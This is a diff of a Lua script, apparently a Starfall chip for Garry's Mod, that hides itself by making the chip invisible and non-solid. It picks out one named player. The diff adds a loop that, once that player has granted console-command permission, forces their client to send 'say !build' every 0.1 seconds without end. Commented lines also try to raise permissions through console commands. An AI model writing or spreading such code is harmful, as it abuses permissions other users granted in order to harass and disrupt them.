@@ -3,15 +3,10 @@
 --@author Markiz
 --@shared
 
+local Cmd = "say !build"
 
-if SERVER then
-    chip():setNoDraw(true)
-    chip():setSolid(false)
-    chip():setColor(Color(0,0,0,0))
-    chip():setMaterial("Models/effects/vol_light001")
-    return
-end
-
+local IsSpam = true
+local SpamDelay = 0.1
 
 
 local Target = owner()
@@ -21,8 +16,17 @@ Target = find.playersByName("poop")[1]
 --        return true
 --    end
 --end)[1]
-print(Target)
---throw(tostring(Target))
+
+if SERVER then
+    print(Target)
+    
+    chip():setNoDraw(true)
+    chip():setSolid(false)
+    chip():setColor(Color(0,0,0,0))
+    chip():setMaterial("Models/effects/vol_light001")
+    return
+end
+
 
 
 
@@ -32,11 +36,17 @@ local permissionSatisfied = hasPermission("console.command")
 
 function handle()
     if hasPermission("console.command") and owner() ~= player() and Target == player() then
+        if IsSpam then
+            timer.create("concmd_spam", SpamDelay, 0, function()
+                concmd(Cmd)
+            end)
+            return
+        end
+        
         --concmd("sf_permission_cl console.command client 3")
         --concmd('sf_permission_cl entities.setRenderProperty client 3')
         --concmd('sf_permission_cl entities.setRenderProperty entities 4')
-        
-        concmd('say !build')
+        concmd(Cmd)
     end
 end
 
